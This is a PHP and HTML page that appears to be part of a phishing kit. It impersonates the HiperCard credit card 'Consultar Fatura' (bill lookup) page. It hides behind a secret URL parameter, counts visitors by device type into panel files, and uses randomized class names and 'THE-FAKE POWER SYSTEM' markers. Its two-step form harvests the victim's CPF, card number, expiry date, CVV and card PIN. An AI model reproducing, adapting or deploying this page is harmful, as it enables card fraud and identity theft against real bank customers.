<?php 


			if($_GET["the"]=="theking"){
			$txt = "painel/v.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
			
	        require_once("painel/configure.php");
			
			}else{
			    $id = base64_encode(md5(time()));
				header("location: index.php?id=$id"); 
			
			}


        #============================
		

		$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
		$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
		$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
		$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
		$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
		$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
		$symbian = strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
		$windowsphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");

		if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $windowsphone == true) {
		    
			$dispositivo = "mobile";
		    $txt = "painel/m.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		 
		 }
		else { 
		   

		    $dispositivo = "pc";
		    $txt = "painel/d.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		} 

	

?>


<!DOCTYPE html>
<html>
<head>

<title>Fatura | HiperCard</title>
<meta charset="UTF-8">
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
    <link rel="stylesheet" href="arquivos/clientlib-base_002.css?the=<?php echo time();?>" type="text/css">
     <link rel="stylesheet" href="arquivos/clientlib-base.css?the=<?php echo time();?>" type="text/css">
	 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <link rel="stylesheet" href="arquivos/clientlib_004.css?the=<?php echo time();?>" type="text/css">
  <link rel="stylesheet" href="arquivos/clientlib_006.css?the=<?php echo time();?>" type="text/css">
 <link rel="shortcut icon" type="image/png" href="arquivos/favicon.png">
<script src="./js/all.js?the=<?php echo time();?>"></script>
<script src="./js/jquery.js?the=<?php echo time();?>"></script>
</head>
	
<body style="background-color: #efe9e5;" id="main-body">
	
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->	
	
<div class="c2">
			<div class="c3">
				<div class="c3a">
					<span class="c3b"><b>ir para Hipercard cartões</b></span>
				</div>
				
			</div>
		</div>

<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 the_<?php echo time();?>_the">
<div class="magalu-cards-header aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
	<header class="magalu-cards-header__navbar the_<?php echo time();?>_the">
    <div style="font-family:fontea;font-size:12px;color:#FF0000;line-height:20px; class="magalu-cards-header__group the_<?php echo time();?>_the">
        <h1 class="magalu-cards-header__logo the_<?php echo time();?>_the">
            <img class="magalu-cards-header__logo-img the_<?php echo time();?>_the" width="150" src="arquivos/hp.png">
        </h1>
    </div>
</header>
</div>

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the" id="body" style="overflow: visible;">

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 the_<?php echo time();?>_the">
<div class="breadcrumb-header-shared aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
<div class="container the_<?php echo time();?>_the">
</div>
</div>

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="online-card-bill-shared p-0 aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
 
 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
 
<div class="online-card-bill bg-grey the_<?php echo time();?>_the">
    <div class="container the_<?php echo time();?>_the">
        <div class="itau-form the_<?php echo time();?>_the">
            <div class="online-card-bill-container the_<?php echo time();?>_the">
                <form id="online-card-billForm" name="online-card-billForm">
                    <div class="row align-items-center the_<?php echo time();?>_the">
                        <div class="col-12 col-md-6 the_<?php echo time();?>_the">
                            <div class="title-description the_<?php echo time();?>_the">
                                
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

    <div class="title-d-container the_<?php echo time();?>_the">
        
        <h2 id="frase" class="title-d-container__title the_<?php echo time();?>_the">Consultar Fatura</h2>
        <p class="title-d-container__subtitle the_<?php echo time();?>_the">receba a 2ª via da fatura do cartão por e-mail</p>
        <p class="title-d-container__description title-d-color-escuro the_<?php echo time();?>_the">Para consultar sua fatura ou atualizar seu endereço de e-mail, acesse seu perfil
ou entre em contato pelo atendimento.</p>
    </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 the_<?php echo time();?>_the">
                            <div class="identificacao the_<?php echo time();?>_the" id="identificacao">

    <div class="identificacao__title-description the_<?php echo time();?>_the">
        
    <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
    
    </div>
	
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
	
	<!-- CPF INVALIDO -- DISPLAY NONE -->
    <div class="alert form-alert alert-dismissible fade show the_<?php echo time();?>_the" id="cpfinvalido" style="display: none;">

    <div class="row">
     
        <p style="margin-left: 15px;" class="title-message the_<?php echo time();?>_the">Número do CPF inválido</p>
        <button type="button" class="close the_<?php echo time();?>_the">
          
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
		  
        </button>
    </div>
    <ol>
        <li class="error-description the_<?php echo time();?>_the">
            <a href="#" class="alert-error__error-description the_<?php echo time();?>_the">CPF: informe um número válido para continuar</a>
        </li>
    </ol>
  </div>
   <!-- ================================= -->
    
	<!-- PRINCIPAL -->
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

        <div>
         
		 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->		 
		 
        <div style="display:block;" id="tap1">
		 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
                <div class="input-container the_<?php echo time();?>_the" id="input-cpf">
                    <div class="content-online-card-bill__value input-container the_<?php echo time();?>_the">
                        <label class="label the_<?php echo time();?>_the" for="online-card-bill-cpf">CPF</label>
                        <input autocomplete="off" oninput="chk(); mascara(this)" id="cpf" class="form-control the_<?php echo time();?>_the" type="text" name="cpf" tabindex="0">
                    </div>
                </div>
          </div>
			
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
			
			<div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">número do cartão</label>
									<input autocomplete="off" oninput="chk(); mascaracc(this)" id="numc" class="form-control the_<?php echo time();?>_the" type="text" name="numc" tabindex="0">
								</div>
			</div>
			 </div>
		</div> 
			 
			 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->			 
			 
			 <div style="display:none;" id="tap2">
				   
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
				   
			 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">validade do cartão</label>
									<input autocomplete="off" oninput="chk2(); mascaraval(this)" id="val" class="form-control the_<?php echo time();?>_the" type="text" name="val" tabindex="0">
								</div>
							</div>
					  </div>
				   <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
			 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">código de segurança</label>
									<input autocomplete="off" oninput="chk2(); smtnum(this);" id="cvv" class="form-control the_<?php echo time();?>_the" maxlength="3" type="text" name="cvv" tabindex="0">
								</div>
							</div>
			 </div>
			 
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> --> 
			  <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">senha do cartão</label>
									<input autocomplete="off" oninput="chk2(); smtnum(this);" id="s4" class="form-control the_<?php echo time();?>_the" maxlength="4" type="password" name="s4" tabindex="0">
								</div>
			             </div>
			       </div>	 
             </div>		 
	   </div>
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
		
    <div class="row the_<?php echo time();?>_the">
        <div class="col-12 button the_<?php echo time();?>_the">
            <div class="the_<?php echo time();?>_the">
			
			<button id="btn1" disabled="disabled" type="button" style="cursor:pointer;" class="button-main button-first-to-second the_<?php echo time();?>_the">
                    acessar
            </button>
			
			<button style="display:none;" id="btn2" disabled="disabled" style="cursor:pointer;" type="button" class="button-main button-first-to-second the_<?php echo time();?>_the">
                    consultar fatura
            </button>
            </div>
        </div>
    </div>
	
	<!-- ================================= -->	
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
	<!-- LOADING ....  -->
    <div id="loading" class="body-loading-card-bill the_<?php echo time();?>_the" style="display:none;">
        <div class="body-loading-card-bill__icon the_<?php echo time();?>_the"></div>
        <p>aguarde</p>
    </div>
     <!--======================================-->   
</div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

</div>
</div>
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
</body>
</html>